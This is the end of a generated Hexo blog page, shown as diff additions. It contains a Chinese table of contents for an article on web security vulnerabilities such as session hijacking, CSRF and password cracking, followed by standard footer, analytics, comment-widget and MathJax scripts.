href="#强制浏览"><span class="nav-number">1.3.1.</span> <span class="nav-text">强制浏览</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不正确的错误消息处理"><span class="nav-number">1.3.2.</span> <span class="nav-text">不正确的错误消息处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开放重定向"><span class="nav-number">1.3.3.</span> <span class="nav-text">开放重定向</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#因会话管理疏忽引发的安全漏洞"><span class="nav-number">1.4.</span> <span class="nav-text">因会话管理疏忽引发的安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#会话劫持"><span class="nav-number">1.4.1.</span> <span class="nav-text">会话劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#会话固定攻击"><span class="nav-number">1.4.2.</span> <span class="nav-text">会话固定攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨站点请求伪造"><span class="nav-number">1.4.3.</span> <span class="nav-text">跨站点请求伪造</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他安全漏洞"><span class="nav-number">1.5.</span> <span class="nav-text">其他安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过网络进行密码试错"><span class="nav-number">1.5.1.</span> <span class="nav-text">通过网络进行密码试错</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#穷举法"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">穷举法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#字典攻击"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">字典攻击</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#对已加密密码的破解"><span class="nav-number">1.5.2.</span> <span class="nav-text">对已加密密码的破解</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#通过穷举法·字典攻击进行类推"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">通过穷举法·字典攻击进行类推</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#彩虹表"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">彩虹表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#拿到密钥"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">拿到密钥</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#加密算法的漏洞"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">加密算法的漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#点击劫持"><span class="nav-number">1.5.3.</span> <span class="nav-text">点击劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DoS-攻击"><span class="nav-number">1.5.4.</span> <span class="nav-text">DoS 攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#后门程序"><span class="nav-number">1.5.5.</span> <span class="nav-text">后门程序</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart throb" style="color: #d43f57;"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">赖彬鸿</span>
+
+  
+</div>
+
+  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize("");
+    }
+  </script>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+<div>
+<span id="busuanzi_container_site_pv" title="访问量">
+    <i class="fa fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span>
+</span>
+<span id="busuanzi_container_site_uv" title="访问人数">
+  <i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span>
+</span>
+<span class="post-count" title="博客总字数"><i class="fa fa-pagelines" aria-hidden="true"></i>745.9k</span>
+</div>
+<i class="fa fa-shield" aria-hidden="true" title="本站安全运行时间"></i> <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("01/29/2018 09:47:04");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds);
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("JcDzlAxx8A0MJDQ9xpJTOBUe-gzGzoHsz", "hih724suAgjSWQnvOuIEvxza");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+  <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
